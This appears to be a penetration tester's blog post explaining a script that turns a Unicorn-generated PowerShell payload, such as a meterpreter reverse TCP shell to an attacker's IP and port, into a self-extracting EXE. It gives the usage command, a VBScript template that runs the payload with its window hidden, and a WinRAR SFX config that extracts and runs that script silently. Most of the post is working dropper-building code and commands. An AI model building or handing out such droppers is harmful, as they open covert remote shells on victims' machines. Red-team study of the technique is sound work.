---
layout: post
title: Making a Powershell EXE Payload
summary: A script to make a powershell payload into an executable
tags:
- payloads
- powershell
---

I've been using TrustedSec's [Unicorn](https://github.com/trustedsec/unicorn) a LOT over the past few months. In fact, it's become my go-to payload to pop a box. While it's awesome to be able to paste a command and get a shell, sometimes an EXE is required.

For those cases, I've made a script to make the whole process automated: `powershell_exe.py`



### tl;dr
`powershell_exe.py` uses winrar's commandline options under wine to make a self-extracting archive. [Source](https://github.com/bluscreenofjeff/Scripts/blob/master/powershell_exe.py)


**Setup instructions**

```bash
cd /opt
git clone https://github.com/trustedsec/unicorn.git

cd ~/Desktop
wget http://www.rarlab.com/rar/wrar511.exe
wine wrar511.exe
```

Now just go through the default options of winrar to finish the install.


**Usage:**

```python
python power_exe.py <payload> <ip address> <port>
Example: python power_exe.py windows/meterpreter/reverse_tcp 192.168.1.5 443
````


**Results**

The script outputs a `powerpay.exe` file and leaves Unicorn's `powershell_attack.txt` file. 

To have the script remove the Unicorn command, uncomment line 39: `system("rm powershell_attack.txt")`



### How it works

The script runs Unicorn using the provided options for payload, IP, and port. The result is the Powershell command text in `powershell_attack.txt`.


The code from `powershell_attack.txt` is inserted into the following vbscript file to call the command without that ugly black command prompt popping up:

```bash
Dim shell,command
command = "<POWERSHELLCOMMAND>"
Set shell = CreateObject("WScript.Shell")
shell.Run command,0
```


An `xfs.config` file is written for winrar:

```bash
;The comment below contains SFX script commands

Path=%Temp%
Setup=run.vbs
Silent=1
Overwrite=1
```

You can have multiple Setup lines in that file, so if you wanted to have the payload run and then create an error or run an intel script, you could just edit the config file, add the file creation to the script, and edit the wine command below.



Winrar's command line options are plentiful, but for our purposes the syntax is as follows:

```bash
wine /root/.wine/drive_c/Program\ Files/WinRAR/Rar.exe a -r -u -sfx -z'xfs.config' powerpay run.vbs
```

What the flags mean:

  * **a** : adds to the designated archive (powerpay in this case)
  * **-r** : recurses subfolders (if applicable)
  * **-u** : updates the archive with new files and adds the new files to the archive
  * **-sfx** : makes the archive an SFX (self-extracting) archive
  * **-z** : specifies the xfs.config file. Note there is no space between the flag and path to config file
  * **powerpay** : name of the archive. This will output as powerpay.exe
  * **run.vbs** : the file being added to the archive. You can add multiple files with spaces between the paths



That's it! It should probably be said that I am **not** a programmer, so the source is definitely not written the "right" way. 

